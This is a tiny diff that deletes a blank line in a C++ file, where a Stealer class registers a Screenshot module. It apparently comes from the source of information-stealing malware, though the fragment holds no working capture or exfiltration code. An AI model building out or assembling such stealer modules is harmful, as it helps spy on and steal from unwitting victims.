@@ -6,7 +6,6 @@
 #include "impl/Screenshot.h"
 #include <thread>
 
-
 void Stealer::registerModules() {
     this->modules.push_back(new Screenshot());
 }
